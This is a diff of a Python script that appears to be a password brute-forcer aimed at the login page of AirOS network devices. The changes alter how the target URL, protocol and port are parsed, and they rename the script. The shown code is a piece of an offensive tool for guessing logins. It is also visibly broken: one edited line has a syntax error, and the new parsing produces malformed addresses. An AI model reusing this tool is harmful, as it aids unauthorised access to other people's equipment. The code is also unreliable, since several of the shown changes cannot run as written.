@@ -39,14 +39,15 @@ def next(string):
 #this function check the state of the server in case it is down!!
 def is_alive(remoteHost):
     try:        
+        host = remoteHost[1:]
         sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-        result = sock.connect_ex(remoteHost)
+        result = sock.connect_ex(host)
         if result == 0:           
             return True
         else:
             i=0
             for i in range(3):  #check the server 3 times, in 3 secons, if not responding wait a minute and then check agen
-                result = sock.connect_ex(remoteHost)
+                result = sock.connect_ex(host)
                 time.sleep(1)
             if result == 0:                
                 return True
@@ -82,14 +83,15 @@ def attack(remoteHost,sequence,username,mc):
                     f.close()
                     sys.exit(0)	            
     except:
-        mc.open('https://' + remoteHost + '/login.cgi?uri=/index.cgi')
+        mc.open(remoteHost[0] + '://' + remoteHost[1] + ":" remoteHost[2] + '/login.cgi?uri=/index.cgi')
         print("[-] System halt (2) restarting!!")
         pass
 sequence = list()
 in_url = sys.argv[1] # Servidor (url)
-url, port = in_url.split('/')[2].split(":")
-print(url, port)
-remoteHost = (url, port)
+protocol, _, url = in_url.split('/')
+host, port = url.split(":")
+print(protocol, host, port)
+remoteHost = (protocol, host, port)
 
 print(remoteHost)
 if is_alive(remoteHost):
@@ -104,7 +106,7 @@ else:
 if len(sys.argv)==2:
     print("Scaning!!")
 else:
-    print("Syntax error ./bforeAIROS.py url")
+    print("Syntax error ./airos.py url")
     sys.exit(0)
 
 
